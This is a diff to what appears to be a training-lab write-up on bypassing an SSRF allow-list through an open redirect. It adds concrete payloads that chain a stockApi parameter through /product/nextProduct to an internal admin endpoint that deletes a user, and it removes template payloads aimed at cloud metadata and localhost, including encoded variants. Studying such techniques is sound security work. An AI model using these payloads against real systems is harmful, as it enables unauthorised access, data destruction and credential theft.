@@ -8,11 +8,11 @@ An **open redirect** on an allow‑listed host lets an attacker **bounce** the r
 to **internal targets** (e.g., `169.254.169.254` or `127.0.0.1`), bypassing the filter.
 
 ## Endpoint (fill after recon)
-- e.g., **POST** /product/stock  (param/body: `stockApi=<URL>`)
+- POST /product/stock HTTP/2  (param/body: stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos)
 
 ## Allow‑list behavior observed
-- External URLs allowed only if host matches an allow‑listed domain (e.g., `https://<allowed-host>...`)
-- Direct internal addresses (e.g., `http://169.254.169.254/...`) blocked.
+- stockApi only accepts same-app URLs; using /product/nextProduct?path=... as       redirector allowed hopping to internal 192.168.0.12:8080.
+
 
 ## Exploit approach
 1) Find an **open redirect** on an allow‑listed domain (parameters like `next=`, `url=`, `redirect=`, `return=`).
@@ -24,12 +24,8 @@ to **internal targets** (e.g., `169.254.169.254` or `127.0.0.1`), bypassing the 
 
 ## Example Payloads (for Repeater)
 # Allowed domain wrapper (change path/param names to match the found redirector):
-https://<allowed-host>/redirect?next=http://169.254.169.254/latest/meta-data/
-https://<allowed-host>/redir?url=http://127.0.0.1/admin
-# Encoded variants (when first hop requires encoding)
-https://<allowed-host>/redirect?next=http%3a%2f%2f169.254.169.254%2flatest%2fmeta-data%2f
-https://<allowed-host>/redirect?next=http%253a%252f%252f169.254.169.254%252flatest%252fmeta-data%252f
-
+http://192.168.0.12:8080/admin/
+http://192.168.0.12:8080/admin/delete?username=carlos
 ## Impact
 Bypass of SSRF domain allow‑list → access to internal services or cloud metadata (credentials, pivots).
 
